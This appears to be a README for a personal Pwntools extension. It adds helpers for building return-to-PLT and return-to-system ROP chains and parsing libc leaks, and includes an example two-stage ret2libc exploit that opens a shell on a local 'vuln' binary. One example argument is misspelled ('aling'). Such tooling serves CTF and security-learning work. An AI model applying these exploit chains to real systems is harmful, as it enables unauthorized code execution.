# Fast-Pwn
Some code I have added to my local Pwntools to speed up things.

Functions Added - 

- ret2system() - creates a return to system rop chain, accepts two arguments align and bin_sh
- ret2plt() - creates a return to plt rop chain, accepts two arguments leak and ret
- recv_libc_leak() - receive 6 bytes on amd64 and 4 bytes on i386, then unpack tye address and substract the offset and return libc base address, accepts one argument offset
- sendpayload() - accepts 2 arguments offset and payload and send flat{offset:payload}
- find_bin_sh() - return /bin/sh address 
- section_addr() - return the address of section like(.bss,.data), accepts 2 arguments name and offset

Quick Fixes -

- libc() - I like to use elf.libc but it is broken so i fixed it but still works only on 64 bit, requirement - `pip3 install pylddwrap`

Example - 

```python
from pwn import *

elf = context.binary = ELF("vuln")
rop = ROP(elf)
libc = elf.libc
offset = 136

io = process()
io.clean()

rop.ret2plt(leak=elf.got.puts, ret=elf.sym.main)
io.sendpayload(offset=offset, payload=rop.chain())

io.recvline()
libc.address = io.recv_libc_leak(offset=libc.sym.puts)

rop1 = ROP(libc)
rop1.ret2system(aling=True)
io.sendpayload(offset=offset, payload=rop1.chain())
io.interactive()
```

# Changes Made
### Added Code to -

[pwnlib/rop/rop.py](pwnlib/rop/rop.py) - Added 2 functions ret2plt and ret2system from line 1552 to 1561
[pwnlib/elf/elf.py](pwnlib/elf/elf.py) - Added 2 functions section_addr and find_bin_sh from line 1547 to 1570, Edited libc function from line 716 to 723
[pwnlib/tubes/tube.py](pwnlib/tubes/tube.py) - Added 1 function sendpayload from line 863 to 872, Added 1 function recv_libc_leak from line 753 to 763

### Created New File

[pwnlib/rop/ret2system.py](pwnlib/rop/ret2system.py)
[pwnlib/rop/ret2plt.py](pwnlib/rop/ret2plt.py)

